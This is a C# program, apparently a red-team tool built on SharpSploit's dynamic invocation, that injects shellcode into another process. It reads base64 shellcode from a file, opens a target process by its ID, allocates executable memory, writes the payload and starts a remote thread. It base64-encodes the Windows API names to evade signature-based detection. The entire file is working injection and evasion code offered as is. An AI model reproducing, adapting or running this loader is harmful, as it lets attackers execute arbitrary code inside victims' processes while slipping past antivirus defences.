using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using SharpSploit.Execution.DynamicInvoke;

namespace dinvoke
{   class Program
    {
        static void Main(string[] args)
        {
            var b64_sc = File.ReadAllText(args[0]);
            Console.WriteLine("[+] Read {0} bytes", b64_sc.Length);
            var sc = System.Convert.FromBase64String(b64_sc);
            Console.WriteLine("[+] Decoded it into {0} bytes", sc.Length);

            string op = "T3BlblByb2Nlc3M="; // echo -n "API_NAME" | base64
            byte[] openc = System.Convert.FromBase64String(op);
            string opdec = Encoding.UTF8.GetString(openc);
            var pointer = Generic.GetLibraryAddress("kernel32.dll", opdec);
            var OpPr = Marshal.GetDelegateForFunctionPointer(pointer, typeof(OpPr)) as OpPr;
            var hProcess = OpPr(0x001F0FFF, false, int.Parse(args[1]));
            Console.WriteLine("[+] hProcess: 0x" + string.Format("{0:X}", hProcess.ToInt64()));

            string va = "VmlydHVhbEFsbG9jRXg=";
            byte[] vaenc = System.Convert.FromBase64String(va);
            string vadec = Encoding.UTF8.GetString(vaenc);
            pointer = Generic.GetLibraryAddress("kernel32.dll", vadec);
            var VAx = Marshal.GetDelegateForFunctionPointer(pointer, typeof(VAx)) as VAx;
            var alloc = VAx(hProcess, IntPtr.Zero, (uint)sc.Length, 0x1000 | 0x2000, 0x40);
            Console.WriteLine("[+] Allocated: " + string.Format("{0}", alloc.ToInt64()));

            string wpm = "V3JpdGVQcm9jZXNzTWVtb3J5";
            byte[] wpmenc = System.Convert.FromBase64String(wpm);
            string wpmdec = Encoding.UTF8.GetString(wpmenc);
            pointer = Generic.GetLibraryAddress("kernel32.dll", wpmdec);
            var WPMdel = Marshal.GetDelegateForFunctionPointer(pointer, typeof(WPMdel)) as WPMdel;
            WPMdel(hProcess, alloc, sc, (uint)sc.Length, out UIntPtr bytesWritten);

            string crt = "Q3JlYXRlUmVtb3RlVGhyZWFk";
            byte[] crtenc = System.Convert.FromBase64String(crt);
            string crtdec = Encoding.UTF8.GetString(crtenc);
            pointer = Generic.GetLibraryAddress("kernel32.dll", crtdec);
            var CRTdelegate = Marshal.GetDelegateForFunctionPointer(pointer, typeof(CRTdelegate)) as CRTdelegate;
            CRTdelegate(hProcess, IntPtr.Zero, 0, alloc, IntPtr.Zero, 0, IntPtr.Zero);
            Console.WriteLine("[+] Payload written");

        }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate IntPtr OpPr(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr VAx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool WPMdel(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr CRTdelegate(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    }
}